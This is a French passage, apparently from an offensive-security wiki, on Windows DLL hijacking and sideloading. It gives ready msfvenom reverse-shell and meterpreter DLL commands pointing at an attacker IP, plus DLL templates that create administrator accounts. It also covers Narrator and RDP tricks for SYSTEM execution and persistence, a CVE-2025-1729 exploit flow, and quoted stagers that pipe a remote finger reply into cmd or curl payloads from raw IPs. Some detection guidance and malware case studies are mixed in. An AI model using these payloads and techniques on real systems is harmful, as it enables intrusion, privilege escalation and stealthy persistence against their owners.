De plus, dans la **section suivante**, vous trouverez du **code dll de base** qui peut être utile comme **modèle** ou pour créer une **dll avec des fonctions non requises exportées**.

## **Création et compilation de DLLs**

### **DLL Proxifying**

En gros, un **proxy DLL** est une DLL capable d’**exécuter votre code malveillant lors de son chargement**, mais aussi de **s’exposer** et de **fonctionner** comme **prévu**, en **relayant tous les appels vers la véritable bibliothèque**.

Avec l’outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier, puis **générer une dll proxifiée**, ou **indiquer la DLL** et **générer une dll proxifiée**.

### **Meterpreter**

**Obtenir un rev shell (x64) :**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtenir un meterpreter (x86) :**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Créer un utilisateur (x86, je n’ai pas vu de version x64) :**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Le vôtre

Dans de nombreux cas, la DLL que vous compilez doit **exporter chaque fonction importée par le processus victime**. Si un export requis est manquant, le binaire ne peut pas le résoudre et l’exploit échoue.

<details>
<summary>Modèle de DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Exemple de DLL C++ avec création d’utilisateur</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternative avec point d’entrée de thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT avec initialisation déclenchée par un export

Une **bibliothèque partagée .NET NativeAOT** autonome peut être utilisée comme DLL native déposée sans implémenter explicitement de `DllMain`. Exportez des méthodes C# statiques avec `[UnmanagedCallersOnly(EntryPoint = "...")]` ; lorsque l’hôte natif appelle l’un de ces points d’entrée générés par le compilateur, NativeAOT initialise le module et une méthode `[ModuleInitializer]` s’exécute avant le corps C# exporté. La sortie ne nécessite pas l’installation séparée du runtime .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

La DLL doit tout de même fournir les **noms d’export et les signatures compatibles avec l’ABI** que l’hôte sélectionné appelle réellement. Des stubs minimaux peuvent suffire à déclencher l’initialisation, mais l’absence d’exports peut empêcher le chargement, et une signature incorrecte peut corrompre l’appel. Énumérez les imports de l’hôte et validez le résultat avec `dumpbin /exports payload.dll` avant de renommer la sortie avec le nom de dépendance attendu par l’hôte.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL exportée NativeAOT minimale</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Configurez le projet comme une bibliothèque partagée native Windows autonome :<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Placez la DLL renommée à côté de l’exécutable vulnérable copié et démarrez l’hôte via le chemin de code qui appelle l’export compatible. Cette approche par initialiseur évite de placer des tâches complexes directement dans `DllMain`, mais les préconditions du sideload restent inchangées : le chargeur doit résoudre la dépendance par son nom, sélectionner le répertoire de l’application et ne pas la trouver d’abord dans KnownDLLs, parmi les modules déjà chargés, via une redirection SxS ou au moyen d’indicateurs `LOAD_LIBRARY_SEARCH_*` restrictifs.<sup>[[26]](#references)[[30]](#references)</sup>

Pour des modèles natifs conventionnels, consultez [Windows C payloads](../windows-c-payloads.md). Un premier stage sideloadé peut ensuite effectuer un [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), mais il s’agit d’une technique d’injection distincte, et non d’une partie de la résolution des DLL.

## Détection : chargements de bibliothèques par DLL masquerading

Elastic Defend 9.5.0 enrichit un événement de chargement de bibliothèque avec `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` lorsque le fichier chargé n’est pas signé par Microsoft et que son nom de fichier correspond à un nom de DLL Windows/système dans l’inventaire mis en cache par Elastic. L’inventaire des noms de fichiers ainsi que l’analyse de l’emplacement système et de la signature sont ainsi pris en charge par le capteur du point de terminaison ; la requête EQL principale peut donc être réduite à :<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Traitez l’enrichissement comme un pivot à forte valeur plutôt que comme une preuve à lui seul. Augmentez le niveau de confiance lorsqu’un hôte signé charge la DLL depuis son propre répertoire **accessible en écriture par l’utilisateur**, que la DLL n’est pas signée ou n’est pas approuvée, et que `dll.Ext.relative_file_creation_time` indique qu’elle a été créée peu avant son chargement. Limitez les exclusions à la combinaison exacte éditeur + processus hôte + chemin d’installation ; ne désactivez pas globalement les alertes pour un nom de DLL en conflit, car des installateurs et applications légitimes peuvent fournir des bibliothèques privées portant des noms similaires à ceux du système.<sup>[[26]](#references)</sup>

Sur les capteurs dépourvus de cet enrichissement, approchez ce comportement en corrélant un nom de DLL en conflit avec un chemin de chargement non système, une signature Microsoft absente ou non approuvée, et un intervalle court entre la création du fichier et son chargement. Cela nécessite un inventaire des noms de DLL tenu à jour et des exclusions ciblées pour `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` et d’autres chemins de déploiement approuvés.<sup>[[26]](#references)</sup>

## Étude de cas : détournement de la DLL de localisation TTS Narrator OneCore (accessibilité/technologies d’assistance)

Windows Narrator.exe recherche toujours au démarrage une DLL de localisation prévisible, spécifique à la langue, qui peut être détournée pour exécuter du code arbitraire et assurer la persistance.<sup>[[7]](#references)</sup>

Faits clés
- Chemin de recherche (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ancien chemin (versions plus anciennes) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL accessible en écriture et contrôlée par un attaquant existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` est exécuté. Aucune fonction exportée n’est requise.

Recherche avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci-dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silence OPSEC
- Un hijack naïf fera parler le Narrator et mettra l’interface en surbrillance. Pour rester discret, à l’attachement, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et suspendez-le avec `SuspendThread` ; poursuivez dans votre propre thread. Consultez le PoC pour le code complet.<sup>[[8]](#references)</sup>

Déclenchement et persistance via la configuration Accessibility
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec la configuration ci-dessus, le démarrage de Narrator charge la DLL implantée. Sur le bureau sécurisé (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.

Exécution SYSTEM déclenchée par RDP (mouvement latéral)
- Autorisez la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connectez-vous à l’hôte par RDP, puis, sur l’écran de connexion, appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.
- L’exécution s’arrête à la fermeture de la session RDP : injectez ou migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un outil Accessibility (AT) intégré (par exemple, CursorIndicator), la modifier pour qu’elle pointe vers un binaire ou une DLL arbitraire, l’importer, puis définir `configuration` sur le nom de cet AT. Cette méthode permet d’exécuter des programmes arbitraires via le framework Accessibility.

Remarques
- L’écriture dans `%windir%\System32` et la modification des valeurs HKLM nécessitent des droits d’administrateur.
- Toute la logique du payload peut se trouver dans `DLL_PROCESS_ATTACH` ; aucune exportation n’est nécessaire.

## Étude de cas : CVE-2025-1729 - Élévation de privilèges à l’aide de TPQMAssistant.exe

Ce cas illustre le **Phantom DLL Hijacking** dans TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), suivi sous le numéro **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Détails de la vulnérabilité

- **Composant** : `TPQMAssistant.exe`, situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute chaque jour à 9 h 30 dans le contexte de l’utilisateur connecté.
- **Autorisations du répertoire** : le répertoire est accessible en écriture par `CREATOR OWNER`, ce qui permet aux utilisateurs locaux d’y déposer des fichiers arbitraires.
- **Comportement de recherche des DLL** : le programme tente d’abord de charger `hostfxr.dll` depuis son répertoire de travail et consigne « NAME NOT FOUND » si le fichier est absent, ce qui indique que le répertoire local est prioritaire dans l’ordre de recherche.

### Mise en œuvre de l’exploit

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire et exploiter l’absence de la DLL pour exécuter du code dans le contexte de l’utilisateur :

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flux d’attaque

1. En tant qu’utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s’exécute à 9:30 AM dans le contexte de l’utilisateur actuel.
3. Si un administrateur est connecté lors de l’exécution de la tâche, la DLL malveillante s’exécute dans la session de l’administrateur avec un niveau d’intégrité moyen.
4. Enchaîner des techniques standard de contournement de l’UAC pour passer du niveau d’intégrité moyen aux privilèges SYSTEM.

## Étude de cas : dropper MSI CustomAction + DLL side-loading via un hôte signé (wsc_proxy.exe)

Les acteurs malveillants associent souvent des droppers basés sur MSI au DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.<sup>[[10]](#references)</sup>

Vue d’ensemble de la chaîne
- L’utilisateur télécharge le MSI. Une CustomAction s’exécute silencieusement pendant l’installation graphique (par exemple, LaunchApplication ou une action VBScript) et reconstitue l’étape suivante à partir de ressources intégrées.
- Le dropper écrit un EXE légitime et signé, ainsi qu’une DLL malveillante, dans le même répertoire (exemple : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l’attaquant).
- Lorsque l’EXE signé est démarré, l’ordre de recherche des DLL de Windows charge d’abord wsc.dll depuis le répertoire de travail, ce qui exécute le code de l’attaquant sous un processus parent signé (ATT&CK T1574.001).

Analyse du MSI (points à vérifier)
- Table CustomAction :
  - Rechercher les entrées qui exécutent des fichiers exécutables ou du VBScript. Exemple de modèle suspect : LaunchApplication qui exécute un fichier intégré en arrière-plan.
  - Dans Orca (Microsoft Orca.exe), inspecter les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés ou fragmentés dans le CAB du MSI :
  - Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ou utiliser lessmsi : lessmsi x package.msi C:\out
  - Rechercher plusieurs petits fragments concaténés et déchiffrés par une CustomAction VBScript. Flux courant :

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
  - wsc_proxy.exe : hôte légitime signé (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
  - wsc.dll : DLL de l’attaquant. Si aucun export spécifique n’est requis, DllMain peut suffire ; sinon, créez une proxy DLL et transférez les exports requis vers la bibliothèque authentique tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Pour les exigences d’exportation, utilisez un framework de proxy (par exemple DLLirant/Spartacus) pour générer une DLL de forwarding qui exécute également votre payload.

- Cette technique repose sur la résolution des noms de DLL par le binaire hôte. Si l’hôte utilise des chemins absolus ou des indicateurs de chargement sécurisé (par exemple LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les exports forwardés peuvent influer sur l’ordre de priorité et doivent être pris en compte lors du choix du binaire hôte et de l’ensemble d’exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad à l’aide d’une **triade de trois fichiers** pour se fondre dans des logiciels légitimes tout en conservant le payload principal chiffré sur le disque :<sup>[[12]](#references)</sup>

1. **EXE hôte signé** – des éditeurs tels qu’AMD, Realtek ou NVIDIA sont détournés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour le faire ressembler à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **DLL loader malveillante** – déposée à côté de l’EXE sous un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué à l’aide du framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, de le déchiffrer et de mapper ShadowPad par réflexion.
3. **Blob de payload chiffré** – souvent stocké sous la forme `<name>.tmp` dans le même répertoire. Après avoir mappé en mémoire le payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensiques.

Notes sur les techniques utilisées :

* Renommer l’EXE signé (tout en conservant le `OriginalFileName` d’origine dans l’en-tête PE) lui permet de se faire passer pour un binaire Windows tout en gardant la signature de l’éditeur ; reproduisez donc l’habitude d’Ink Dragon de déposer des binaires ressemblant à `conhost.exe`, mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l’exécutable reste approuvé, la plupart des contrôles d’autorisation d’exécution n’exigent que la présence de votre DLL malveillante à ses côtés. Concentrez-vous sur la personnalisation de la DLL loader ; le parent signé peut généralement être exécuté sans modification.
* Le déchiffreur de ShadowPad s’attend à ce que le blob TMP se trouve à côté du loader et que le fichier soit modifiable afin de pouvoir le mettre à zéro après le mapping. Gardez le répertoire accessible en écriture jusqu’au chargement du payload ; une fois celui-ci en mémoire, le fichier TMP peut être supprimé sans risque pour l’OPSEC.

### Chaîne de sideloading d’archive par étapes avec stager LOLBAS (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS pour que le seul artefact personnalisé sur le disque soit la DLL malveillante située à côté de l’EXE approuvé :<sup>[[1]](#references)</sup>

- **Loader de commandes distant (Finger) :** PowerShell caché lance `cmd.exe /c`, récupère des commandes depuis un serveur Finger et les transmet à `cmd` :

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` récupère le texte via TCP/79 ; `| cmd` exécute la réponse du serveur, permettant aux opérateurs de faire tourner le serveur de second stage.

- **Téléchargement/extraction intégrés :** téléchargez une archive avec une extension anodine, décompressez-la et placez la cible de sideload ainsi que la DLL dans un dossier `%LocalAppData%` aléatoire :

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise l’outil tar intégré à Windows.

- **Lancement via WMI/CIM :** Démarrez l’EXE via WMI afin que la télémétrie indique un processus créé par CIM pendant qu’il charge la DLL située dans le même répertoire :

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Fonctionne avec les binaires qui privilégient les DLL locales (p. ex. `intelbq.exe`, `nearby_share.exe`) ; le payload (p. ex. Remcos) s’exécute sous un nom de confiance.

- **Détection :** déclencher une alerte sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; cette combinaison est rare en dehors des scripts d’administration.


## Étude de cas : dropper NSIS + sideload du Bitdefender Submission Wizard (Chrysalis)

Une intrusion récente de Lotus Blossom a exploité une chaîne de mise à jour de confiance pour livrer un dropper empaqueté avec NSIS, qui préparait un sideload de DLL ainsi que des payloads entièrement en mémoire.<sup>[[13]](#references)</sup>

Déroulement des opérations
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque comme **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, un `log.dll` malveillant et un blob chiffré `BluetoothService`, puis lance l’EXE.
- L’EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob avec mmap ; `LogWrite` le déchiffre à l’aide d’un chiffrement par flot personnalisé basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, matériau de clé dérivé d’un hash précédent), écrase le buffer avec le shellcode en clair, libère les données temporaires, puis lui transfère l’exécution.
- Pour éviter une IAT, le loader résout les API en calculant le hash des noms d’exportation avec **FNV-1a, base 0x811C9DC5 + premier 0x1000193**, puis en appliquant un avalanche de type Murmur (**0x85EBCA6B**) et en comparant le résultat aux hash cibles salés.

Shellcode principal (Chrysalis)
- Déchiffre un module principal de type PE en répétant des opérations add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l’exécution via des transformations de rotation de bits/XOR caractère par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second résolveur qui parcourt **PEB → InMemoryOrderModuleList**, analyse chaque table d’exportation par blocs de 4 octets avec un mélange de type Murmur, et ne se rabat sur `GetProcAddress` que si le hash est introuvable.

Configuration intégrée et C2
- La configuration se trouve dans le fichier `BluetoothService` déposé, à l’**offset 0x30808** (taille **0x980**), et est déchiffrée avec RC4 à l’aide de la clé `qwhvb^435h&*7`, révélant l’URL C2 et le User-Agent.
- Les beacons construisent un profil d’hôte délimité par des points, ajoutent le tag `4Q` au début, puis chiffrent le tout avec RC4 à l’aide de la clé `vAuig34%^325hGV` avant d’appeler `HttpSendRequestA` via HTTPS. Les réponses sont déchiffrées avec RC4 et traitées selon un switch de tags (`4T` shell, `4V` exécution de processus, `4W/4X` écriture de fichier, `4Y` lecture/exfiltration, `4\\` désinstallation, `4` énumération des lecteurs/fichiers + cas de transfert par blocs).
- Le mode d’exécution dépend des arguments CLI : sans argument = installation de la persistance (service/clé Run) pointant vers `-i` ; `-i` relance le processus avec `-k` ; `-k` ignore l’installation et exécute le payload.

Autre loader observé
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à ses côtés. Le code source C fourni par l’attaquant contenait du shellcode, qui était compilé puis exécuté en mémoire sans écrire de PE sur disque. Reproduire avec :

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Cette étape de compilation et d’exécution basée sur TCC a importé `Wininet.dll` à l’exécution et récupéré un shellcode de deuxième étape depuis une URL codée en dur, fournissant ainsi un loader flexible qui se fait passer pour une compilation.

## Sideloading d’un hôte signé avec proxying des exports + mise en attente du thread de l’hôte

Certaines chaînes de DLL sideloading ajoutent de l’**ingénierie de stabilité** afin que l’hôte légitime reste actif assez longtemps pour charger proprement les étapes suivantes, au lieu de planter après le chargement de la DLL malveillante.<sup>[[11]](#references)</sup>

Motif observé
- Déposer un EXE de confiance à côté d’une DLL malveillante portant le nom de dépendance attendu, comme `version.dll`.
- La DLL malveillante **proxy tous les exports attendus** vers la véritable DLL système (par exemple `%SystemRoot%\\System32\\version.dll`) afin que la résolution des imports réussisse et que le processus hôte continue de fonctionner.
- Après son chargement, la DLL malveillante **patche le point d’entrée de l’hôte** afin que le thread principal entre dans une boucle infinie `Sleep`, au lieu de se terminer ou d’exécuter des chemins de code qui mettraient fin au processus.
- Un nouveau thread effectue le véritable travail malveillant : déchiffrer le nom ou le chemin de la DLL de l’étape suivante (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying normal de DLL préserve la compatibilité des API, mais ne garantit pas que l’hôte restera actif assez longtemps pour les étapes suivantes.
- Mettre le thread principal en attente avec `Sleep(INFINITE)` est un moyen simple de garder le processus signé en mémoire pendant que le loader effectue le déchiffrement, la préparation ou l’initialisation réseau dans un thread de travail.
- Une recherche limitée à un `DllMain` suspect peut manquer ce motif si le comportement intéressant survient après le patch du point d’entrée de l’hôte et le démarrage d’un thread secondaire.

Procédure minimale
1. Copier l’EXE signé de l’hôte et déterminer quelle DLL il charge depuis le répertoire local.
2. Créer une DLL proxy exportant les mêmes fonctions et les redirigeant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un thread de travail.
4. Depuis ce thread, patcher le point d’entrée de l’hôte ou la routine de démarrage du thread principal pour qu’il boucle sur `Sleep`.
5. Déchiffrer le nom/la configuration de la DLL de l’étape suivante et appeler `LoadLibrary` ou mapper manuellement le payload.

Pistes de détection
- Processus signés qui chargent `version.dll` ou des bibliothèques courantes similaires depuis leur propre répertoire d’application au lieu de `System32`.
- Patches mémoire au point d’entrée du processus peu après le chargement de l’image, en particulier des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une seconde DLL dont le nom a été déchiffré.
- DLL proxy exposant tous les exports et placées à côté d’exécutables de fournisseurs dans des répertoires de préparation accessibles en écriture, comme `ProgramData`, `%TEMP%` ou des chemins d’archives extraites.

## References

- [1] [Red Canary – Informations sur les menaces : janvier 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Élévation de privilèges via TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT : DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking sous Windows. Exemple simple en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore déploie de nouveaux malwares ciblant l’Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility : quand les DLL Hijacks rencontrent les assistants Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers numériques : anatomie de campagnes d’usurpation en évolution distribuant Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Convergence des intérêts : analyse des clusters de menaces ciblant un gouvernement d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Au cœur d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis : analyse approfondie de la boîte à outils de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Chaîne HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Suivi des campagnes d’espionnage 2026 de l’APT iranien Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Élément `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Élément `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Élément `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Élément `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Élément `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Élément `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rapides et furieux : opérations de Nimbus Manticore pendant le conflit iranien](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Actions de tâche](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cible les gouvernements et les infrastructures critiques d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Reconstruction et détection du détournement de l’ordre de recherche des DLL sous Windows avec Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Création de bibliothèques natives avec Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Exports natifs avec Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
